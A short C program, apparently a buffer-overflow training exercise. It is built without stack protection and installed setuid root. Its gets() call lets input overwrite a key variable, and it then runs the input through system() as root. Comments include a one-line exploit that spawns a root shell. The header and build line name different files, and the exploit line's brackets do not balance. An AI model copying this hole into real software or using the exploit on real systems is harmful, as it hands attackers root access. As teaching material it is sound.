// AFTER => bof4.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x12345678

// COMPILE $ gcc -fno-stack-protector bof5.c -o bof5
// SETUID  $ sudo chown root:root bof5
//         $ sudo chmod 4755 bof5
// EXPLOIT $ {python3 -c "print('/bin/sh\x00'+'\x78\x56\x34\x12'*34";cat} | ./bof5

int main(){
    int innocent;
    char buf[BUF_SIZE];

    puts("\033[32m" "enter your name :)" "\033[0m");
    gets(buf);
    printf("Hello " "\033[33m" "%s" "\033[0m" "!\n", buf);

    if (innocent == KEY) {
        if (setuid(0)) {
            perror("setuid");
            return 1;
        }
        system(buf);
    }
    return 0;
}
